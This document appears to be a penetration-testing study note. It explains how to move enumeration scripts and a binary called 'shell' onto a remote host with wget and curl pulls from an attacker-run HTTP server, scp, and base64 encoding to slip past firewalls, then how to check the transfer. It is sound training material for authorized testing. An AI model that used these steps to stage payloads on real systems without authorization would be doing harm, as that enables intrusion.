# Transferring Files

## Overview
File transfer is an essential part of penetration testing, often required for uploading enumeration scripts, exploits, or retrieving data from a remote server. Below are several methods to transfer files during a penetration test.

---

## Methods of Transferring Files

### 1. Using `wget`
#### Steps:
1. Start a Python HTTP server on your attack host in the directory containing the file to transfer:
   ```bash
   python3 -m http.server 8000
   ```
2. Download the file on the remote server using `wget`:
   ```bash
   wget http://<YOUR_IP>:8000/<FILENAME>
   ```

#### Example:
```bash
wget http://10.10.14.1:8000/linenum.sh
```

### 2. Using `curl`
#### Steps:
1. Use `curl` as an alternative to `wget`:
   ```bash
   curl http://<YOUR_IP>:8000/<FILENAME> -o <OUTPUT_FILENAME>
   ```

#### Example:
```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

---

### 3. Using SCP
#### Prerequisites:
- SSH access to the remote host.

#### Steps:
1. Transfer the file using `scp`:
   ```bash
   scp <LOCAL_FILE> <USER>@<REMOTE_HOST>:<REMOTE_DIRECTORY>
   ```

#### Example:
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

---

### 4. Using Base64 Encoding
#### Use Case:
When direct file transfer is blocked (e.g., firewalls).

#### Steps:
1. Base64 encode the file on your machine:
   ```bash
   base64 <FILENAME> -w 0
   ```
2. Copy the encoded string to the remote host.
3. Decode the string on the remote host and save it to a file:
   ```bash
   echo <BASE64_STRING> | base64 -d > <OUTPUT_FILE>
   ```

#### Example:
1. Encode:
   ```bash
   base64 shell -w 0
   ```
2. Decode on the remote host:
   ```bash
   echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... | base64 -d > shell
   ```

---

## Validating File Transfers

### 1. Check File Type
Run the `file` command to validate the file type:
```bash
file <FILENAME>
```

#### Example:
```bash
file shell
# Output: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked
```

### 2. Verify Integrity with `md5sum`
#### Steps:
1. Generate an MD5 hash of the file on your machine:
   ```bash
   md5sum <FILENAME>
   ```
2. Generate an MD5 hash of the transferred file on the remote host:
   ```bash
   md5sum <FILENAME>
   ```
3. Compare the hashes to ensure the file transferred correctly.

#### Example:
1. Local machine:
   ```bash
   md5sum shell
   # Output: 321de1d7e7c3735838890a72c9ae7d1d shell
   ```
2. Remote host:
   ```bash
   md5sum shell
   # Output: 321de1d7e7c3735838890a72c9ae7d1d shell
   ```

---

## Additional Resources
- For more methods and details, refer to the File Transfers module.
